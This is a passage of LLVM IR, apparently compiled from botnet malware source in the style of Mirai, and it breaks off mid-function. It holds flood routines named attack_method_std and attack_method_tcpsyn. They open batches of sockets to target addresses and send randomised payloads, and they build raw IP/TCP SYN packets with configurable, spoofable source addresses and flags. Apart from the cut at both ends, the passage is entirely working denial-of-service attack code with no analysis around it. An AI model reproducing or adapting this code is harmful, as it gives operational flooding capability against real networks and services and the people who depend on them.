  %447 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %448 = load i32, i32* %9, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %447, i64 %449
  %451 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %450, i32 0, i32 0
  %452 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %451, i32 0, i32 1
  store i16 0, i16* %452, align 2
  %453 = load i32, i32* %10, align 4
  %454 = load i8*, i8** %30, align 8
  %455 = load i32, i32* %18, align 4
  %456 = sext i32 %455 to i64
  %457 = add i64 66, %456
  %458 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %459 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %460 = load i32, i32* %9, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i64 %461
  %463 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %462, i32 0, i32 0
  %464 = bitcast %struct.sockaddr_in* %463 to %struct.sockaddr*
  store %struct.sockaddr* %464, %struct.sockaddr** %458, align 8
  %465 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %466 = load %struct.sockaddr*, %struct.sockaddr** %465, align 8
  %467 = call i64 @sendto(i32 noundef %453, i8* noundef %454, i64 noundef %457, i32 noundef 16384, %struct.sockaddr* %466, i32 noundef 16)
  br label %468

468:                                              ; preds = %401
  %469 = load i32, i32* %9, align 4
  %470 = add nsw i32 %469, 1
  store i32 %470, i32* %9, align 4
  br label %257, !llvm.loop !16

471:                                              ; preds = %257
  br label %256

472:                                              ; preds = %92, %86
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_std(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 noundef %24, i64 noundef 8) #7
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 noundef %28, i64 noundef 4) #7
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 noundef zeroext %31, %struct.attack_option* noundef %32, i8 noundef zeroext 7, i32 noundef 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 noundef zeroext %35, %struct.attack_option* noundef %36, i8 noundef zeroext 6, i32 noundef 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 0, i32 noundef 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 noundef zeroext %43, %struct.attack_option* noundef %44, i8 noundef zeroext 1, i32 noundef 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %47, i8 0, i64 16, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

51:                                               ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

54:                                               ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 noundef zeroext %55) #8
  store i16 %56, i16* %13, align 2
  br label %57

57:                                               ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

58:                                               ; preds = %170, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %173

63:                                               ; preds = %58
  %64 = call noalias i8* @calloc(i64 noundef 65535, i64 noundef 1) #7
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

72:                                               ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

81:                                               ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 noundef zeroext %82) #8
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

90:                                               ; preds = %81, %72
  %91 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #7
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

97:                                               ; preds = %90
  ret void

98:                                               ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 noundef %108, %struct.sockaddr* %112, i32 noundef 16) #7
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

115:                                              ; preds = %98
  br label %116

116:                                              ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %151

125:                                              ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 noundef %131) #8
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, %141
  %143 = call i32 @htonl(i32 noundef %142) #8
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 0
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %148, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  store i32 %143, i32* %150, align 4
  br label %151

151:                                              ; preds = %125, %116
  %152 = load i32*, i32** %11, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = bitcast %struct.sockaddr_in* %162 to %struct.sockaddr*
  store %struct.sockaddr* %163, %struct.sockaddr** %157, align 8
  %164 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %165 = load %struct.sockaddr*, %struct.sockaddr** %164, align 8
  %166 = call i32 @connect(i32 noundef %156, %struct.sockaddr* %165, i32 noundef 16)
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %168, label %169

168:                                              ; preds = %151
  br label %169

169:                                              ; preds = %168, %151
  br label %170

170:                                              ; preds = %169
  %171 = load i32, i32* %9, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %9, align 4
  br label %58, !llvm.loop !17

173:                                              ; preds = %58
  br label %174

174:                                              ; preds = %205, %173
  store i32 0, i32* %9, align 4
  br label %175

175:                                              ; preds = %202, %174
  %176 = load i32, i32* %9, align 4
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp slt i32 %176, %178
  br i1 %179, label %180, label %205

180:                                              ; preds = %175
  %181 = load i8**, i8*** %10, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8*, i8** %181, i64 %183
  %185 = load i8*, i8** %184, align 8
  store i8* %185, i8** %22, align 8
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

188:                                              ; preds = %180
  %189 = load i8*, i8** %22, align 8
  %190 = load i16, i16* %14, align 2
  %191 = zext i16 %190 to i32
  call void @rand_str(i8* noundef %189, i32 noundef %191)
  br label %192

192:                                              ; preds = %188, %180
  %193 = load i32*, i32** %11, align 8
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i64
  %201 = call i64 @send(i32 noundef %197, i8* noundef %198, i64 noundef %200, i32 noundef 16384)
  br label %202

202:                                              ; preds = %192
  %203 = load i32, i32* %9, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %9, align 4
  br label %175, !llvm.loop !18

205:                                              ; preds = %175
  br label %174
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

; Function Attrs: nounwind
declare i32 @bind(i32 noundef, %struct.sockaddr*, i32 noundef) #1

declare i32 @connect(i32 noundef, %struct.sockaddr*, i32 noundef) #4

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_tcpsyn(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 noundef %35, i64 noundef 8) #7
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 noundef zeroext %38, %struct.attack_option* noundef %39, i8 noundef zeroext 2, i32 noundef 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 noundef zeroext %42, %struct.attack_option* noundef %43, i8 noundef zeroext 3, i32 noundef 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 noundef zeroext %46, %struct.attack_option* noundef %47, i8 noundef zeroext 4, i32 noundef 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 noundef zeroext %50, %struct.attack_option* noundef %51, i8 noundef zeroext 5, i32 noundef 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 noundef zeroext %54, %struct.attack_option* noundef %55, i8 noundef zeroext 6, i32 noundef 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 noundef zeroext %58, %struct.attack_option* noundef %59, i8 noundef zeroext 7, i32 noundef 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 noundef zeroext %62, %struct.attack_option* noundef %63, i8 noundef zeroext 17, i32 noundef 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 noundef zeroext %65, %struct.attack_option* noundef %66, i8 noundef zeroext 18, i32 noundef 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 11, i32 noundef 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 12, i32 noundef 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 13, i32 noundef 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 noundef zeroext %80, %struct.attack_option* noundef %81, i8 noundef zeroext 14, i32 noundef 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 noundef zeroext %84, %struct.attack_option* noundef %85, i8 noundef zeroext 15, i32 noundef 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 noundef zeroext %88, %struct.attack_option* noundef %89, i8 noundef zeroext 16, i32 noundef 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 noundef zeroext %92, %struct.attack_option* noundef %93, i8 noundef zeroext 25, i32 noundef %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

98:                                               ; preds = %4
  br label %437

99:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 noundef %100, i32 noundef 0, i32 noundef 3, i8* noundef %101, i32 noundef 4) #7
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

104:                                              ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 noundef %105)
  br label %437

107:                                              ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

108:                                              ; preds = %285, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %288

113:                                              ; preds = %108
  %114 = call noalias i8* @calloc(i64 noundef 128, i64 noundef 1) #7
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, 15
  %135 = or i8 %134, 64
  store i8 %135, i8* %132, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, -16
  %140 = or i8 %139, 5
  store i8 %140, i8* %137, align 4
  %141 = load i8, i8* %12, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = call zeroext i16 @htons(i16 noundef zeroext 60) #8
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 2
  store i16 %144, i16* %146, align 2
  %147 = load i16, i16* %13, align 2
  %148 = call zeroext i16 @htons(i16 noundef zeroext %147) #8
  %149 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 3
  store i16 %148, i16* %150, align 4
  %151 = load i8, i8* %14, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 5
  store i8 %151, i8* %153, align 4
  %154 = load i8, i8* %15, align 1
  %155 = icmp ne i8 %154, 0
  br i1 %155, label %156, label %160

156:                                              ; preds = %113
  %157 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 4
  store i16 %157, i16* %159, align 2
  br label %160

160:                                              ; preds = %156, %113
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 6
  store i8 6, i8* %162, align 1
  %163 = load i32, i32* %26, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 8
  store i32 %163, i32* %165, align 4
  %166 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %167 = load i32, i32* %9, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 9
  store i32 %171, i32* %173, align 4
  %174 = load i16, i16* %16, align 2
  %175 = call zeroext i16 @htons(i16 noundef zeroext %174) #8
  %176 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  store i16 %175, i16* %177, align 4
  %178 = load i16, i16* %17, align 2
  %179 = call zeroext i16 @htons(i16 noundef zeroext %178) #8
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 1
  store i16 %179, i16* %181, align 2
  %182 = load i32, i32* %18, align 4
  %183 = trunc i32 %182 to i16
  %184 = call zeroext i16 @htons(i16 noundef zeroext %183) #8
  %185 = zext i16 %184 to i32
  %186 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 2
  store i32 %185, i32* %187, align 4
  %188 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = and i16 %190, -241
  %192 = or i16 %191, 160
  store i16 %192, i16* %189, align 4
  %193 = load i8, i8* %20, align 1
  %194 = sext i8 %193 to i16
  %195 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %195, i32 0, i32 4
  %197 = load i16, i16* %196, align 4
  %198 = and i16 %194, 1
  %199 = shl i16 %198, 13
  %200 = and i16 %197, -8193
  %201 = or i16 %200, %199
  store i16 %201, i16* %196, align 4
  %202 = load i8, i8* %21, align 1
  %203 = sext i8 %202 to i16
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %203, 1
  %208 = shl i16 %207, 12
  %209 = and i16 %206, -4097
  %210 = or i16 %209, %208
  store i16 %210, i16* %205, align 4
  %211 = load i8, i8* %22, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 11
  %218 = and i16 %215, -2049
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %23, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 10
  %227 = and i16 %224, -1025
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %24, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 9
  %236 = and i16 %233, -513
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %25, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 8
  %245 = and i16 %242, -257
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8*, i8** %29, align 8
  %248 = getelementptr inbounds i8, i8* %247, i32 1
  store i8* %248, i8** %29, align 8
  store i8 2, i8* %247, align 1
  %249 = load i8*, i8** %29, align 8
  %250 = getelementptr inbounds i8, i8* %249, i32 1
  store i8* %250, i8** %29, align 8
  store i8 4, i8* %249, align 1
  %251 = call i32 @rand_next()
  %252 = and i32 %251, 15
  %253 = add i32 1400, %252
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 noundef zeroext %254) #8
